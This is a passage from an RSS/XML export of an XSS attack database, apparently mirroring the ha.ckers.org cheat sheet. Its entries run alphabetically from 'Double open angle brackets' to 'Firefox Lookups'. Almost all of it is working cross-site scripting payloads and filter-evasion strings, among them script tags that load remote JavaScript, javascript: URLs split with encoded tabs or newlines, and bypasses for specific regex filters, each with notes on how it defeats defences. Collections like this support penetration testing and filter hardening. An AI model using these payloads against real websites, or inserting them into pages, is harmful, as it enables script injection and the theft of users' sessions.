<ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Double open angle brackets</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1950</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Double open angle brackets&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, injection, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 15:14:26 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't</ddb:exploitDescription>      <ddb:exploitName>Double open angle brackets</ddb:exploitName>      <ddb:exploitString>&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, injection, gecko</ddb:exploitTags>    </item>    <item>      <title>Dword Encoding</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1966</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Dword Encoding&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:21:42 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).</ddb:exploitDescription>      <ddb:exploitName>Dword Encoding</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Embed Flash</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1898</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Embed Flash&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:38:57 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :</ddb:exploitDescription>      <ddb:exploitName>Embed Flash</ddb:exploitName>      <ddb:exploitString>&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Embedded Carriage Return</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1940</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Embedded Carriage Return&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:39:06 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).</ddb:exploitDescription>      <ddb:exploitName>Embedded Carriage Return</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Embedded Encoded Tab</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1938</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Embedded Encoded Tab&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:39:13 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.</ddb:exploitDescription>      <ddb:exploitName>Embedded Encoded Tab</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Embedded Newline</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1939</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Embedded Newline&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:39:27 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.</ddb:exploitDescription>      <ddb:exploitName>Embedded Newline</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Embedded Tab</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1937</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Embedded Tab&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Embedded tab to break up the cross site scripting attack.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:39:40 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Embedded tab to break up the cross site scripting attack.</ddb:exploitDescription>      <ddb:exploitName>Embedded Tab</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>End title tag</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1935</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;End title tag&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, title breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:39:57 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.</ddb:exploitDescription>      <ddb:exploitName>End title tag</ddb:exploitName>      <ddb:exploitString>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, title breaking</ddb:exploitTags>    </item>    <item>      <title>Escaping JavaScript escapes</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1934</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Escaping JavaScript escapes&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;\&quot;;alert('XSS');//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a=”$ENV{QUERY_STRING}”;&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read &lt;SCRIPT&gt;var a=””;alert('XSS');//”;&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:40:13 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a=”$ENV{QUERY_STRING}”;&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read &lt;SCRIPT&gt;var a=””;alert('XSS');//”;&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.</ddb:exploitDescription>      <ddb:exploitName>Escaping JavaScript escapes</ddb:exploitName>      <ddb:exploitString>\&quot;;alert('XSS');//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking</ddb:exploitTags>    </item>    <item>      <title>Evade Regex Filter 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1957</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Evade Regex Filter 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;For performing XSS on sites that allow ”&lt;SCRIPT&gt;” but don't allow ”&lt;SCRIPT SRC...” by way of the following regex filter: /&lt;script[^&gt;]+src/i&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:55:42 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>For performing XSS on sites that allow ”&lt;SCRIPT&gt;” but don't allow ”&lt;SCRIPT SRC...” by way of the following regex filter: /&lt;script[^&gt;]+src/i</ddb:exploitDescription>      <ddb:exploitName>Evade Regex Filter 1</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Evade Regex Filter 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1958</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Evade Regex Filter 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;For performing XSS on sites that allow ”&lt;SCRIPT&gt;” but don't allow ”&lt;SCRIPT SRC...” by way of a regex filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i this is an important one, because I've seen this regex in the wild)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:56:18 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>For performing XSS on sites that allow ”&lt;SCRIPT&gt;” but don't allow ”&lt;SCRIPT SRC...” by way of a regex filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i this is an important one, because I've seen this regex in the wild)</ddb:exploitDescription>      <ddb:exploitName>Evade Regex Filter 2</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Evade Regex Filter 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1959</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Evade Regex Filter 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT a=&quot;blah&quot; '' SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Another XSS to evade this regex filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:56:50 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Another XSS to evade this regex filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i</ddb:exploitDescription>      <ddb:exploitName>Evade Regex Filter 3</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT a=&quot;blah&quot; '' SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Evade Regex Filter 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1960</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Evade Regex Filter 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT &quot;a='&gt;'&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Yet another XSS to evade the same filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i    &lt;br&gt;The only thing I've seen work against this XSS attack if you still want to allow &lt;SCRIPT&gt; tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:57:14 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Yet another XSS to evade the same filter: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i    &#13;&#10;The only thing I've seen work against this XSS attack if you still want to allow &lt;SCRIPT&gt; tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags)</ddb:exploitDescription>      <ddb:exploitName>Evade Regex Filter 4</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT &quot;a='&gt;'&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Evade Regex Filter 5</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1961</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Evade Regex Filter 5&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;And one last XSS attack (using grave accents) to evade this regex: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:57:32 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>And one last XSS attack (using grave accents) to evade this regex: /&lt;script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”&gt;\s]+))?)+\s*|\s*)src/i</ddb:exploitDescription>      <ddb:exploitName>Evade Regex Filter 5</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Eval string contained in name property</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3232</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Eval string contained in name property&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;eval(name)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This very simple but effective vector uses the eval method on the name property.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, super short, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;SIrDarckCat</description>      <pubDate>Sun, 26 Aug 07 16:47:54 -0400</pubDate>      <ddb:authorName>SIrDarckCat</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This very simple but effective vector uses the eval method on the name property.</ddb:exploitDescription>      <ddb:exploitName>Eval string contained in name property</ddb:exploitName>      <ddb:exploitString>eval(name)</ddb:exploitString>      <ddb:exploitTags>general, super short, self contained</ddb:exploitTags>    </item>    <item>      <title>Extra dot for Absolute DNS</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1975</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Extra dot for Absolute DNS&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:42:12 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).</ddb:exploitDescription>      <ddb:exploitName>Extra dot for Absolute DNS</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Extraneous Open Brackets</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1951</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Extraneous Open Brackets&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:42:30 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.</ddb:exploitDescription>      <ddb:exploitName>Extraneous Open Brackets</ddb:exploitName>      <ddb:exploitString>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Filter Evasion 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1962</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Filter Evasion 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:42:55 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.</ddb:exploitDescription>      <ddb:exploitName>Filter Evasion 1</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Filter Evasion 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1963</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Filter Evasion 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT a=&quot;&gt;'&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:43:05 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.</ddb:exploitDescription>      <ddb:exploitName>Filter Evasion 2</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT a=&quot;&gt;'&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Firefox Lookups 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1971</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Firefox Lookups 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:44:25 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”</ddb:exploitDescription>      <ddb:exploitName>Firefox Lookups 1</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, gecko</ddb:exploitTags>    </item>    <item>      <title>Firefox Lookups 2</title>      